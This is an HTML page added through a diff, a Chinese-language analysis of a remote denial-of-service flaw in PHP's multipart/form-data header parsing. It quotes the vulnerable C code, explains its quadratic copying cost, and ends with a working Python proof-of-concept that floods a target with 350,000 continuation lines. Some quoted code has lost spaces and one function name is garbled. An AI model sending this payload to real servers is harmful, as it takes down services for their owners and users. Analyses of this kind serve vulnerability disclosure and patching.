@@ -1,0 +1,193 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>PHP multipart/form-data 远程DOS漏洞</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>PHP multipart/form-data 远程DOS漏洞</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAwMDQwNTE5MA==&amp;mid=206869140&amp;idx=1&amp;sn=9a4783e68a55bf0f82bfb4522cb70e76&amp;chksm=1349493d243ec02bcbbbd520242f6319738da7a385de8c6ee8086daaace797e79267ba13ced3&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAwMDQwNTE5MA==&amp;mid=206869140&amp;idx=1&amp;sn=9a4783e68a55bf0f82bfb4522cb70e76&amp;chksm=1349493d243ec02bcbbbd520242f6319738da7a385de8c6ee8086daaace797e79267ba13ced3&amp;scene=27#wechat_redirect</a></blockquote><p style=""><strong><span style="font-family: 宋体;">摘要：</span></strong></p><p style="">PHP<span style="font-family: 宋体;">解析</span>multipart/form-datahttp<span style="font-family: 宋体;">请求的</span>body part<span style="font-family: 宋体;">请求头时，重复拷贝字符串导致</span>DOS<span style="font-family: 宋体;">。远程攻击者通过发送恶意构造的</span>multipart/form-data<span style="font-family: 宋体;">请求，导致服务器</span>CPU<span style="font-family: 宋体;">资源被耗尽，从而远程DOS服务器。</span></p><p style=""><br/></p><p style=""><strong><span style="font-family: 宋体;">影响范围：</span></strong></p><p style="">PHP<span style="font-family: 宋体;">所有版本</span></p><p style=""><br/></p><p style=""><strong><span style="font-family: 宋体;"><span style="text-indent: 28px;">一、漏洞入口</span></span></strong></p><p style="">PHP<span style="font-family: 宋体;">源码中</span>main/ rfc1867.c<span style="font-family: 宋体;">负责解析</span>multipart/form-data<span style="font-family: 宋体;">协议，</span>DOS<span style="font-family: 宋体;">漏洞出现在</span>main/rfc46675pxultipart_buffer_headers<span style="font-family: 宋体;">函数。</span></p><p style=""><span style="font-family: 宋体;">在详细分析漏洞函数前，先分析进入漏洞函数的路径。</span>PHP<span style="font-family: 宋体;">解析</span>multipart/form-data http<span style="font-family: 宋体;">请求体的入口函数在</span>SAPI_POST_HANDLER_FUNC(rfc1867.c<span style="font-family: 宋体;">中的函数</span>)<span style="font-family: 宋体;">，代码如下。</span></p><pre class="brush:cpp;toolbar:false;" style="">/* Get the boundary */
+boundary= strstr(content_type_dup, "boundary");
+ if(!boundary) {
+     intcontent_type_len = strlen(content_type_dup);
+     char*content_type_lcase = estrndup(content_type_dup, content_type_len);
+ 
+     php_strtolower(content_type_lcase,content_type_len);
+     boundary= strstr(content_type_lcase, "boundary");
+     if(boundary) {
+             boundary= content_type_dup + (boundary - content_type_lcase);
+     }
+     efree(content_type_lcase);
+  }
+  if(!boundary || !(boundary = strchr(boundary, '='))) {
+       sapi_module.sapi_error(E_WARNING,"Missing boundary in multipart/form-data POST data");
+       return;
+   }
+   boundary++;
+   boundary_len= strlen(boundary);
+   …
+   …
+   while(!multipart_buffer_eof(mbuff TSRMLS_CC))
+   {
+                   charbuff[FILLUNIT];
+                   char*cd = NULL, *param = NULL, *filename = NULL, *tmp = NULL;
+                   size_tblen = 0, wlen = 0;
+                   off_toffset;
+ 
+                   zend_llist_clean(&amp;header);
+ 
+                   if(!multipart_buffer_headers(mbuff, &amp;header TSRMLS_CC)) {
+                            gotofileupload_done;
+                   }
+   
+   SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary，</pre><p style=""><span style="font-family: 宋体;"/></p><p style=""><br/></p><p style=""><strong>二、漏洞函数multipart_buffer_headers执行逻辑 </strong>                  </p><p style=""><span style="font-family: 宋体;">  进入漏洞函数，本段先分析漏洞函数的执行逻辑，下一段根据函数执行逻辑详细分析漏洞的原理。</span>multipart_buffer_headers函数<span style="font-family: 宋体;">源码如下：</span></p><pre class="brush:cpp;toolbar:false" style="">/* parse headers */
+static intmultipart_buffer_headers(multipart_buffer *self, zend_llist *header TSRMLS_DC)
+{
+         char*line;
+         mime_header_entryprev_entry = {0}, entry;
+         intprev_len, cur_len;
+ 
+         /*didn't find boundary, abort */
+         if(!find_boundary(self, self-&gt;boundary TSRMLS_CC)) {
+                   return0;
+         }
+ 
+         /*get lines of text, or CRLF_CRLF */
+ 
+         while((line = get_line(self TSRMLS_CC)) &amp;&amp; line[0] != '\0' )
+         {
+                   /*add header to table */
+                   char*key = line;
+                   char*value = NULL;
+ 
+                   if(php_rfc1867_encoding_translation(TSRMLS_C)) {
+                            self-&gt;input_encoding= zend_multibyte_encoding_detector(line, strlen(line), self-&gt;detect_order,self-&gt;detect_order_size TSRMLS_CC);
+                   }
+ 
+                   /*space in the beginning means same header */
+                   if(!isspace(line[0])) {
+                            value= strchr(line, ':');
+                   }
+ 
+                   if(value) {
+                            *value= 0;
+                            do{ value++; } while(isspace(*value));
+ 
+                            entry.value= estrdup(value);
+                            entry.key= estrdup(key);
+ 
+                   }else if (zend_llist_count(header)) { /* If no ':' on the line, add to previousline */
+ 
+                            prev_len= strlen(prev_entry.value);
+                            cur_len= strlen(line);
+ 
+                            entry.value= emalloc(prev_len + cur_len + 1);
+                            memcpy(entry.value,prev_entry.value, prev_len);
+                            memcpy(entry.value+ prev_len, line, cur_len);
+                            entry.value[cur_len+ prev_len] = '\0';
+ 
+                            entry.key= estrdup(prev_entry.key);
+ 
+                            zend_llist_remove_tail(header);
+                   }else {
+                            continue;
+                   }
+ 
+                   zend_llist_add_element(header,&amp;entry);
+                   prev_entry= entry;
+         }
+ 
+         return1;
+}</pre><p style=""> multipart_buffer_headers函数首先找boundary，如果找到boundary就执行以下代码，逐行读取请求的输入以解析body port header:</p><pre class="brush:cpp;toolbar:false" style="">             while((line = get_line(self TSRMLS_CC)) &amp;&amp; line[0] != '\0' ) { … }</pre><p style="">当使用get_line读入一行字符，如果该行第一个字符line[0]不是空白字符, 查找line是否存在':'。</p><p style="">如果line存在字符':'：        </p><p style=""> value指向':'所在的内存地址。这时if(value)条件成立，成功解析到(header,value)对entry。调用zend_llist_add_element(header, &amp;entry)存储，并使用prev_entry记录当前解析到的header，用于解析下一行。</p><p style="">否则，line不存在字符':'：</p><p style=""><span style="font-family: 宋体;">    认为这一行的内容是上一行解析到</span>header<span style="font-family: 宋体;">对应</span>value<span style="font-family: 宋体;">的值，因此进行合并。合并操作执行以下代码。</span></p><p style=""><span style="font-family: 宋体;">    </span></p><pre class="brush:cpp;toolbar:false" style="">         prev_len= strlen(prev_entry.value);
+         cur_len= strlen(line);
+ 
+         entry.value= emalloc(prev_len + cur_len + 1); //为合并value重新分片内存
+         memcpy(entry.value,prev_entry.value, prev_len); //拷贝上一行解析到header对应value
+         memcpy(entry.value+ prev_len, line, cur_len);   //把当前行作为上一行解析到header的value值，并拷贝到上一行value值得后面。
+         entry.value[cur_len+ prev_len] = '\0';
+ 
+         entry.key= estrdup(prev_entry.key);
+ 
+         zend_llist_remove_tail(header);</pre><p style=""><span style="font-family: 宋体;">    首先，为了合并</span>value<span style="font-family: 宋体;">重新分配内存，接着拷贝上一行解析到的</span>value<span style="font-family: 宋体;">值到新分配的内容，然后把当前行的字符串作为上一行解析到</span>header<span style="font-family: 宋体;">的</span>value<span style="font-family: 宋体;">值，并拷贝到</span>value<span style="font-family: 宋体;">值得后面。最后调用</span>zend_llist_remove_tail(header)<span style="font-family: 宋体;">删除上一行的记录。执行完后获得了新的</span>entry<span style="font-family: 宋体;">，调用</span>zend_llist_add_element(header,&amp;entry)<span style="font-family: 宋体;">记录得到的</span>header<span style="font-family: 宋体;">名值对</span>(header,value)<span style="font-family: 宋体;">。</span></p><p style="">   </p><p style=""><br/></p><p style=""><strong><span style="font-family: 宋体;">三、漏洞原理：</span></strong></p><p style=""><span style="font-family: 宋体;">  在</span>multipart_buffer_headers<span style="font-family: 宋体;">函数解析</span>header<span style="font-family: 宋体;">对应</span>value<span style="font-family: 宋体;">时，</span>value<span style="font-family: 宋体;">值存在</span>n<span style="font-family: 宋体;">行。每行的字符串以空白符开头或不存字符</span>':'<span style="font-family: 宋体;">，都触发以下合并</span>value<span style="font-family: 宋体;">的代码块。那么解析</span>header<span style="font-family: 宋体;">的</span>value<span style="font-family: 宋体;">就要执行</span>(n-1)<span style="font-family: 宋体;">次合并</span>value<span style="font-family: 宋体;">的代码块。该代码块进行</span>1<span style="font-family: 宋体;">次内存分配，</span>2<span style="font-family: 宋体;">次内存拷贝，</span>1<span style="font-family: 宋体;">次内存释放。当</span>value<span style="font-family: 宋体;">值越来越长，将消耗大量的</span>cpu<span style="font-family: 宋体;">时间。如果以拷贝一个字节为时间复杂度单位，</span>value<span style="font-family: 宋体;">的长度为</span>m<span style="font-family: 宋体;">，时间复杂度为</span>m*m.</p><pre class="brush:cpp;toolbar:false" style=""> prev_len= strlen(prev_entry.value);
+         cur_len= strlen(line);
+ 
+         entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存
+         memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝
+         memcpy(entry.value+ prev_len, line, cur_len);   //1次拷贝
+         entry.value[cur_len+ prev_len] = '\0';
+ 
+         entry.key= estrdup(prev_entry.key);
+ 
+         zend_llist_remove_tail(header);//1次内存释放</pre><p style=""><span style="font-family: 宋体;"><br/></span></p><p style=""><strong><span style="font-family: 宋体;">四、利用：</span></strong></p><p style=""><span style="font-family: 宋体;">  构造恶意的</span>http<span style="font-family: 宋体;">请求</span><span style="font-family: 宋体;">，在我的测试环境中，一个</span>http<span style="font-family: 宋体;">请求将消耗</span>10s<span style="font-family: 宋体;">的</span>cpu<span style="font-family: 宋体;">时间。每隔若干秒，同时并发多个请求，将导致</span>server<span style="font-family: 宋体;">端</span>cpu<span style="font-family: 宋体;">资源长期耗尽，从而到达</span>DOS<span style="font-family: 宋体;">。总的来说，利用方式和</span>Hash Collision DOS<span style="font-family: 宋体;">一样。</span></p><p style=""><span style="font-family: 宋体;"><br/></span></p><p style=""><strong><span style="font-family: 宋体;">五、POC</span></strong></p><pre class="brush:python;toolbar:false" style="">'''
+Author: Shusheng Liu,The Department of Security Cloud, Baidu
+email: liusscs@163.com
+'''
+import sys
+import urllib,urllib2
+import datetime
+from optparse import OptionParser
+
+def http_proxy(proxy_url):
+
+    proxy_handler = urllib2.ProxyHandler({"http" : proxy_url})
+    null_proxy_handler = urllib2.ProxyHandler({})
+    opener = urllib2.build_opener(proxy_handler)
+    urllib2.install_opener(opener)
+#end http_proxy 
+
+def check_php_multipartform_dos(url,post_body,headers):
+	req = urllib2.Request(url)
+	for key in headers.keys():
+		req.add_header(key,headers[key])
+	starttime = datetime.datetime.now();
+	fd = urllib2.urlopen(req,post_body)
+	html = fd.read()
+	endtime = datetime.datetime.now()
+	usetime=(endtime - starttime).seconds
+	if(usetime &gt; 5):
+		result = url+" is vulnerable";
+	else:
+		if(usetime &gt; 3):
+			result = "need to check normal respond time"
+	return [result,usetime]
+#end
+
+
+def main():
+    #http_proxy("http://127.0.0.1:8089")
+    parser = OptionParser()
+    parser.add_option("-t", "--target", action="store", 
+                  dest="target", 
+                  default=False, 
+		  type="string",
+                  help="test target")
+    (options, args) = parser.parse_args()
+    if(options.target):
+	target = options.target
+    else:
+	return;
+
+    Num=350000
+    headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
+            'Accept-Encoding':'gzip, deflate',
+            'User-Agent':'Mozillal/5.0 (Windows NT 6.1; WOW64) AppleWebKiti/537.36 (KHTML, like Gecko) Chromeu/40.0.2214.111 Safariss/537.36'}
+    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
+    payload=""
+    for i in range(0,Num):
+        payload = payload + "a\n"
+    body = body + payload;
+    body = body + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
+    print "starting...";
+    respond=check_php_multipartform_dos(target,body,headers)
+    print "Result : "
+    print respond[0]
+    print "Respond time : "+str(respond[1]) + " seconds";
+
+if __name__=="__main__":
+    main()</pre><p><br/></p>
+        
+</body>
+</html>
